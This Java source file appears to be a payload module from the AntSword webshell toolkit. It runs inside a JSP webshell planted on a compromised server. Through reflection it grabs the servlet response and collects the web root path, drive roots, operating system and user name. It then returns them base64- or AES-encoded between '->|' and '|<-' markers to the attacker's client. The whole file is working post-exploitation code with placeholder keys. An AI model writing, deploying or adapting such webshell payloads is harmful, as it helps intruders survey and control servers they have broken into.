package base;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.lang.reflect.Field;
import javax.crypto.*;
import java.security.*;
import javax.crypto.spec.*;

public class Info {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs;
    public String key = "antswordAESKey";
    public String encode = "antswordDefault"; // default base64 aes

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
        cs = "UTF-8";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(SysInfoCode(request));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + encoder(encode,output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String encoder(String encode,String text) throws Exception {
        String res = "";

        if("base64".equals(encode)){
            res = base64Encode(text.getBytes());
        }else if ("aes".equals(encode)){
            res = AesEncrypt(key,text);
        }else{
            res = text;
        }
        return res;
    }


    String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                value = value.replace("\n", "").replace("\r", "");
            } catch (Exception e2) {
                
            }
        }
        return value;
    }
    String AesEncrypt(String key, String cleartext) throws Exception {
        cleartext = base64Encode(cleartext.getBytes());
        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
        SecretKeySpec keys = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance(new String("AES/CFB/NoPadding"));
        cipher.init(Cipher.ENCRYPT_MODE, keys, zeroIv);  
        byte[] encryptedData = cipher.doFinal(cleartext.getBytes("UTF-8"));
        String sb = base64Encode(encryptedData);
        return sb;
    }

    String SysInfoCode(HttpServletRequest r) {
        String d = "";
        try {
            if (r.getSession().getServletContext().getRealPath("/") != null) {
                d = r.getSession().getServletContext().getRealPath("/");
            } else {
                String cd = this.getClass().getResource("/").getPath();
                d = new File(cd).getParent();
            }
        } catch (Exception e) {
            String cd = this.getClass().getResource("/").getPath();
            d = new File(cd).getParent();
        }
        d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
        if (!d.startsWith("/") && d.charAt(1) != 58) {
            d = System.getProperty("user.dir");
        }
        String serverInfo = System.getProperty("os.name");
        String user = System.getProperty("user.name");
        String driverlist = this.WwwRootPathCode(d);
        return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }

    String WwwRootPathCode(String d) {
        StringBuilder s = new StringBuilder();
        if (!d.startsWith("/")) {
            try {
                File[] roots = File.listRoots();
                for (File root : roots) {
                    s.append(root.toString(), 0, 2);
                }
            } catch (Exception e) {
                s.append("/");
            }
        } else {
            s.append("/");
        }
        return s.toString();
    }
}
